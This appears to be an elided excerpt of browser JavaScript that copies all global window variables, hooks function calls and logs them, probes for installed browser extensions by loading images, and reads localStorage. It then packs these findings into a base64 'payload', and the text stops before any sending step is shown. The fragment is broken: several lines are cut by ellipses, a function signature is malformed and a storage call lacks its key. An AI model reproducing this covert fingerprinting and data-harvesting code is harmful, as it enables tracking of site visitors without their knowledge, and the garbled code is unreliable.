...
for (let varName in window) {
  globalVarCollector[varName] = window[varName];
}
;
const jshookTracker = {
  observedActions: [],
  observe: function (context, method, descriptor) {
    const baseFunc = descriptor.value;
    descriptor.value = (...args) => {
      this.observedActions.push({
        method,
        arguments: args,
        timestamp: Date.now()
      });
      return baseFunc.apply(context, args);
    };
    return descriptor;
  }
};
...
const extensionProbe = {
  ...
  async probe(name, {
    ...
    return new Promise(resolve => {
      ...
      img.onload = this.jshook.observe(this, 'onload', {
        value: () => {
      ...
      img.onerror = this.jshook.observe(this, 'onerror', {
        value: () => {
          clearTimeout(timeout);
          this.discovered.delete(name);
          resolve(false);
  ...
  async scan() {
    ...
    const localStorageData = JSON.stringify(localStorage.getItem());
    const payload = btoa(JSON.stringify({
      findings: results,
      jshook: this.jshook.observedActions,
      globalVars: globalVarCollector,
